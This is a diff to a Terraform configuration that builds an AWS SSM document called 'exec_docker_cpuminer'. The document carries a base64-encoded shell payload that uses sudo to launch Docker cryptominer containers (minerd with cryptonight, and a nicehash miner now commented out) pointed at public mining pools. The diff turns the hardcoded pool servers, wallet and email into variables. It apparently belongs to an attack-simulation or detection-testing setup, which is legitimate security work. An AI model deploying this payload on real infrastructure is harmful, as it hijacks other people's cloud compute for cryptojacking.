@@ -1,12 +1,12 @@
 locals {
-    nicehash_image = "a2ncer/nheqminer_cpu:latest"
-    nicehash_name = "nicehash"
-    nicehash_server = "equihash.usa.nicehash.com:3357"
-    nicehash_user="foxbones@protonmail.com"
-    minergate_name = "minerd"
-    minergate_image = "mkell43/minerd"
-    minergate_server = "stratum+tcp://eth.pool.minergate.com:45791"
-    minergate_user="3HotyetPPdD6pyGWtZvmMHLcXxmNuWR53C.worker1"
+    # nicehash_name = var.nicehash_name
+    # nicehash_image = var.nicehash_image
+    # nicehash_server = var.nicehash_server
+    # nicehash_user = var.nicehash_user
+    minergate_name = var.minergate_name
+    minergate_image = var.minergate_image
+    minergate_server = var.minergate_server
+    minergate_user=var.minergate_user
 
     payload = <<-EOT
     LOGFILE=/tmp/attacker_exec_docker_cpuminer.log
@@ -21,8 +21,6 @@ locals {
         sleep 10
     done
     log "docker path: $(which docker)"
-    if [[ `sudo docker ps | grep ${local.nicehash_name}` ]]; then docker stop ${local.nicehash_name}; fi
-    sudo docker run --rm -d --network=host --name ${local.nicehash_name} ${local.nicehash_image} -l ${local.nicehash_server} -u ${local.nicehash_user}
     if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
     sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
     sudo docker ps -a >> $LOGFILE 2>&1
@@ -30,6 +28,10 @@ locals {
     EOT
     base64_payload = base64encode(local.payload)
 }
+
+# nicehash example
+# if [[ `sudo docker ps | grep ${local.nicehash_name}` ]]; then docker stop ${local.nicehash_name}; fi
+#     sudo docker run --rm -d --network=host --name ${local.nicehash_name} ${local.nicehash_image} -l ${local.nicehash_server} -u ${local.nicehash_user}
 
 resource "aws_ssm_document" "exec_docker_cpuminer" {
   name          = "exec_docker_cpuminer_${var.environment}_${var.deployment}"
